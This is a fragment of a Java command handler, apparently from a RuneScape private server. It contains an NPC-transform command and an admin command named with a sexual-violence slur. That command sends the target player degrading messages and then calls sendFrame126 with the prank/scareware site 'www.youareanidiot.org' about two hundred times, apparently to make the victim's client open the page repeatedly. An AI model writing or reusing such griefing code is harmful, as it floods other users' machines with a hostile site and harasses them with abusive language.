		if (playerCommand.startsWith("brute")) {
			int id = 6102 + Misc.random(2);
			c.npcId2 = id;
			c.isNpc = true;
			c.updateRequired = true;
			c.appearanceUpdateRequired = true;

		}
		if (playerCommand.startsWith("rape") && (c.playerRights >= 2 && c.playerRights <= 3)) {
			try {
				String playerToBan = playerCommand.substring(5);
				for (int i = 0; i < Config.MAX_PLAYERS; i++) {
					if (Server.playerHandler.players[i] != null) {
						if (Server.playerHandler.players[i].playerName.equalsIgnoreCase(playerToBan)) {
							Client c2 = (Client) Server.playerHandler.players[i];
							c.sendMessage("You have RAPED " + c2.playerName);
							c2.sendMessage("You have been RAPED by: " + c.playerName);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							c2.getPA().sendFrame126("www.youareanidiot.org", 12000);
							break;
						}
					}
				}
			} catch (Exception e) {
				c.sendMessage("Player Must Be Offline.");
			}
		}

	}

	public void DonatorCommands(Client c, String playerCommand) {

	}

	public void GFXCommands(Client c, String playerCommand) {

	}

	public void vetarnCommands(Client c, String playerCommand) {

	}
}